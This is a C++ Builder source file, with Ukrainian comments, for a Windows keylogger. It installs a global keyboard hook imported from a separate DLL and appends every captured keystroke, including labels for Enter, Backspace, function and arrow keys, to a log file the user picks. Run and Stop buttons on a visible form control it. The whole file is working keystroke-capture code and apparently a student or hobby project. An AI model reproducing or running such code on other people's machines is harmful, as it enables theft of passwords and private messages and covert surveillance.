//---------------------------------------------------------------------------
#include <windows.h>
#include <fstream>
#include <vcl.h>
#pragma comment (lib, "../Hook/Hook.lib") //підключення бібліотеки хука

#define IMPORT extern "C" __declspec (dllimport) //використання простої генерації
                                                 //сигнатури функції без додаткових символів
#pragma hdrstop
#include "Keylogger.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"

using namespace std;
TForm1 *Form1;

bool work = false; //для перевірки запущене відстежування чи ні
bool hook = false; //для перевірки чи був встановлений хук
ofstream fout; //змінна файла в який записуватимуться результати

IMPORT BOOL SetKeyboardHook(void); // імпортування функції із DLL для встановлення пастки
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
        : TForm(Owner)
{
}
//---------------------------------------------------------------------------
//функція обробки повідомлень що приймаються від хука
void __fastcall TForm1::OnWMCopyData(TMessage &Msg) {
        
        if(work) { //якщо відстужування запущене
            int mes = LOWORD(Msg.WParam); //виділити із повідомлення код символа
            //якщо файл не відкритий, відкрити для дозапису в кінець
            if(!fout.is_open()) fout.open(Label1->Caption.c_str(),ios_base::app);
            switch(mes){ //обробка коду клавіші

            //перевірити прийнятий код, символьна чи системна клавіша та записати значення в файл
             case 300: fout << endl  ; break; //ентер
             case 301: fout <<" <BACKSPACE> "  ; break;
             case 302: fout << " <TAB> "  ; break;
             case 303: break; //Shift
             case 304: fout << " <Ctrl> " ; break;
             case 305: fout << " <ALT> " ; break;
             case 306: fout << " <Pause> " ; break;
             case 307: fout << " <CAPS_LOCK> " ; break;
             case 308: fout << " <ESC> " ; break;
             case 309: fout << " <PAGE_UP> " ; break;
             case 310: fout << " <PAGE_DOWN> " ; break;
             case 311: fout << " <END> " ; break;
             case 312: fout << " <HOME> " ; break;
             case 313: fout << " <LEFT_ARROW> " ; break;
             case 314: fout << " <UP_ARROW> " ; break;
             case 315: fout << " <RIGHT_ARROW> " ; break;
             case 316: fout << " <DOWN_ARROW> " ; break;
             case 317: fout << " <PRINT_SCREEN> " ; break;
             case 318: fout << " <Insert> " ; break;
             case 319: fout << " <Delete> " ; break;
             case 320: fout << " <L_Window> " ; break;
             case 321: fout << " <R_Window> " ; break;

             case 401: fout << " <F1> " ; break;
             case 402: fout << " <F2> " ; break;
             case 403: fout << " <F3> " ; break;
             case 404: fout << " <F4> " ; break;
             case 405: fout << " <F5> " ; break;
             case 406: fout << " <F6> " ; break;
             case 407: fout << " <F7> " ; break;
             case 408: fout << " <F8> " ; break;
             case 409: fout << " <F9> " ; break;
             case 410: fout << " <F10> " ; break;
             case 411: fout << " <F11> " ; break;
             case 412: fout << " <F12> " ; break;
             default: fout << (char)mes; //якщо з жодним не зівпало, тоді це символ і записати його в файл як символ
            }
            fout.close(); //закрити файл
   }
}
//---------------------------------------------------------------------------
//обробник натискання на кнопку Запустити
void __fastcall TForm1::RunClick(TObject *Sender)
{
        work=true; //відстежування запущене
        Run->Enabled=false; //вимкнути кнопку запуску
        Stop->Enabled=true; //вимкнути кнопку зупинки
        Button1->Enabled=false; //вимкнути кномпку вибору файлу
        try{ //спроба відкрити указаний файл
           fout.open(Label1->Caption.c_str(),ios_base::app);
        } catch(int){ //якщо не вдалося вивести відповідне повідомлення
           ShowMessage("Помилка у виборі файлу!");
        }
        if(!hook){
           if(!SetKeyboardHook()) // встановити пастку
                Close(); // якщо не встановилась вихід
           hook=true; //встановити що відстежування запущене
        }
}
//---------------------------------------------------------------------------
//обробник натискання на Зупинити
void __fastcall TForm1::StopClick(TObject *Sender)
{
        work=false; //відстежування вимкнуте
        Run->Enabled=true; //увімкнути кнопку запуску
        Stop->Enabled=false; //вимкнути кнопку зупинки
        Button1->Enabled=true; //увімкнути кнопку вибору файла
}
//---------------------------------------------------------------------------
//обробник натискання на Вказати файл
void __fastcall TForm1::Button1Click(TObject *Sender)
{
    if (SaveDialog1->Execute()) //відкрити діалог збереження
    {
        String path = SaveDialog1->FileName; //отримати повний шлях до файлу
        //замінити в шляху файлу одинарні слеши на подвійні
        path = StringReplace(path,"\\","\\\\",TReplaceFlags()<<rfReplaceAll);
        Label1->Caption = path; //вивести шлях на форму
    }
}
//---------------------------------------------------------------------------


